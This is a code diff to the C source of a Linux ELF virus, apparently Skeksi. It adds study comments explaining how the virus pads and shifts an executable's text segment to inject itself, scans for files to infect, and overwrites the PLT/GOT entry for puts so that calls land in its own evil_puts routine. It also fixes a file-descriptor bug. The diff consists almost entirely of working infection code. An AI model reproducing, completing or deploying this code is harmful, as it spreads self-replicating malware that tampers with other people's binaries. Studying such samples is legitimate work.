@@ -218,7 +218,7 @@ int evil_puts(const char *string)
 	char new[1024];
 	int index = 0;
 	int rnum = get_random_number(5);
-	if (rnum != 3)
+	if (rnum != 3) //PER: 1/5 probability
 		goto normal;
 
 	Memset(new, 0, 1024);
@@ -385,11 +385,12 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
   
 	/*
          * Seek to end of tracer.o + PAGE boundary  
-         * [ehdr][virus][pad]
+         * [ehdr][virusInit][JMP_PATCH][virus_Remaining][pad]
          * pad = paddingSize-parasiteSize
+		 * paddingSize=[virusInit][JMP_PATCH][virus_Remaining][pad]
 		 */
         uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
-        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
+        if ((c = _lseek(fdo, offset, SEEK_SET)) != offset) 
 		return -1;
         
         /*
@@ -400,6 +401,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
         
         unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
         if ((c = _write(ofd, mem, final_length)) != final_length) 
+		/*PER: TMP = [ehdr_target][virusInit][JMP_PATCH][virus_Remaining][pad][phdrs][text][data][shdrs]*/
 		return -1;
 
 	_close(ofd);
@@ -438,12 +440,14 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	
 	phdr[0].p_offset += paddingSize; // PER: 40+virus size
     phdr[1].p_offset += paddingSize;
-        
+    
+	//PER: all segments are given the offset of paddingSize except the code segment
 	for (i = 0; i < ehdr->e_phnum; i++) {
 		if (text_found)
 			phdr[i].p_offset += paddingSize;
 
 		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
+			//PER: Code segment
 			origText = phdr[i].p_vaddr;
 			phdr[i].p_vaddr -= paddingSize;
 			phdr[i].p_paddr -= paddingSize;
@@ -562,45 +566,48 @@ int load_target(const char *path, elfbin_t *elf)
 
 int load_target_writeable(const char *path, elfbin_t *elf)
 {
-        int i;
-        struct stat st;
-        elf->path = (char *)path;
-        int fd = _open(path, O_RDWR, 0);
-        if (fd < 0)
-                return -1;
-        elf->fd = fd;
-        if (_fstat(fd, &st) < 0)
-                return -1;
-        elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-        if (elf->mem == MAP_FAILED)
-                return -1;
-        elf->ehdr = (Elf64_Ehdr *)elf->mem;
-        elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
-        elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
-        for (i = 0; i < elf->ehdr->e_phnum; i++) {
-                switch(elf->phdr[i].p_type) {
-                        case PT_LOAD:
-                                switch(!!elf->phdr[i].p_offset) {
-                                case 0:
-                                        elf->textVaddr = elf->phdr[i].p_vaddr;
-                                        elf->textSize = elf->phdr[i].p_memsz;
-                                        break;
-                                case 1:
-                                        elf->dataVaddr = elf->phdr[i].p_vaddr;
-                                        elf->dataSize = elf->phdr[i].p_memsz;
-                                        elf->dataOff = elf->phdr[i].p_offset;
-                                        break;
-                        }
-                                break;
-                        case PT_DYNAMIC:
-                                elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
-                                break;
-                }
+	//PER: path is the temporary file with injected virus
+	//PER: elf the target file with updated pointers
+	//PER: target_file <= TMP;
+	int i;
+	struct stat st;
+	elf->path = (char *)path;
+	int fd = _open(path, O_RDWR, 0);
+	if (fd < 0)
+			return -1;
+	elf->fd = fd;
+	if (_fstat(fd, &st) < 0)
+			return -1;
+	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+	if (elf->mem == MAP_FAILED)
+			return -1;
+	elf->ehdr = (Elf64_Ehdr *)elf->mem;
+	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
+	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
+	for (i = 0; i < elf->ehdr->e_phnum; i++) {
+			switch(elf->phdr[i].p_type) {
+					case PT_LOAD:
+							switch(!!elf->phdr[i].p_offset) {
+							case 0:
+									elf->textVaddr = elf->phdr[i].p_vaddr;
+									elf->textSize = elf->phdr[i].p_memsz;
+									break;
+							case 1:
+									elf->dataVaddr = elf->phdr[i].p_vaddr;
+									elf->dataSize = elf->phdr[i].p_memsz;
+									elf->dataOff = elf->phdr[i].p_offset;
+									break;
+					}
+							break;
+					case PT_DYNAMIC:
+							elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
+							break;
+			}
 
-        }
-        elf->st = st;
-        elf->size = st.st_size;
-        return 0;
+	}
+	elf->st = st;
+	elf->size = st.st_size;
+	return 0;
 }
 /* 
  * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
@@ -623,7 +630,9 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
 		switch(dyn[i].d_tag) {
 			case DT_SYMTAB: // relative to the text segment base
-				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];			
+				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];	
+				//PER: `dyn[i].d_un.d_ptr` and `target->textVaddr` are absolute address in the memory but we \
+				//need the relative address from the starting of mem to access information in mem(symtab)	
 				break;
 			case DT_PLTGOT: // relative to the data segment base
 				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
@@ -636,11 +645,11 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 				break;
 			case DT_JMPREL:
 				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
+				//PER: jmprel contains relocation entries
 				break;
 			case DT_PLTRELSZ:
 				jmprel_size = (size_t)dyn[i].d_un.d_val;
 				break;
-	
 		}
 	}
 	if (symtab == NULL || pltgot == NULL) {
@@ -661,7 +670,8 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 	}
 	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
 		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel[i].r_info)].st_name], "puts")) {
-			gotaddr = jmprel[i].r_offset;
+			//PER: if the current relocation affects the puts symbol
+			gotaddr = jmprel[i].r_offset; //Addreess to do relocation
 			gotoff = target->dataOff + (jmprel[i].r_offset - target->dataVaddr);
 			DEBUG_PRINT("gotaddr: %x gotoff: %x\n", gotaddr, gotoff);
 			break;
@@ -816,14 +826,16 @@ rescan:
                                 continue;
 infect:
 			load_target(fpath, &target);
-			new_base = infect_elf_file(&self, &target);
+			new_base = infect_elf_file(&self, &target); 
+			// PER: newbase is the (original virtual address of the code segment of target file) - paddingSize
 			unload_target(&target); 
 #ifdef INFECT_PLTGOT
-			load_target_writeable(TMP, &target);
+			load_target_writeable(TMP, &target); //PER: target_file <= TMP;
 			base_addr = PIC_RESOLVE_ADDR(&_start);
 			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
 			evilputs_offset = evilputs_addr - base_addr;
-			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
+			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr)); 
+			//PER: changing the puts function relocation entry to the attacker's created evilputs function
 			unload_target(&target);
 #endif
 
@@ -840,7 +852,6 @@ infect:
 	rnum = get_random_number(50); // PER: outputs a 0<= random_number <=50 
 	if (rnum == LUCKY_NUMBER) 
 		display_skeksi();
-	
 }
 
 int _getuid(void)
